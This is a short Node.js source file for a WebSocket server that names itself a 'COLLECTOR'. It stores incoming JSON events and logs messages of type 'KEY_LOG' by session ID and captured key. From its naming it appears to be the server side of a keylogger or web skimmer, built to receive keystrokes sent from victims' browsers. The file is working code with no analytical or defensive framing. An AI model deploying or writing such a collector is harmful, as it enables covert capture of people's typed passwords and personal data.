import { WebSocketServer } from "ws";
import http from "http";

const port = process.env.PORT || 5000;

const server = http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/plain; charset=utf-8" });
  res.end("ok");
});

const wss = new WebSocketServer({ server });

server.listen(port, () => {
  console.log("COLLECTOR(WS) listening on port " + port);
});

const events = [];
const MAX_EVENTS = 2000;

wss.on("connection", (socket) => {
  console.log("[collector] client connected");

  socket.on("message", (raw) => {
    try {
      const msg = JSON.parse(raw.toString("utf8"));
      events.push(msg);
      if (events.length > MAX_EVENTS) events.shift();

      const et = msg?.type || "UNKNOWN";
      const sid = msg?.sid || "-";

      if (et === "KEY_LOG") {
        const key = msg?.val || "";
        console.log(`[collector] ${et} | SID: ${String(sid).slice(0, 8)} | Key: "${key}"`);
      }
    } catch (e) {
      console.log(`[collector] bad message (${e.message}):`, raw.toString("utf8").slice(0, 120));
    }
  });

  socket.on("close", () => console.log("[collector] client disconnected"));
});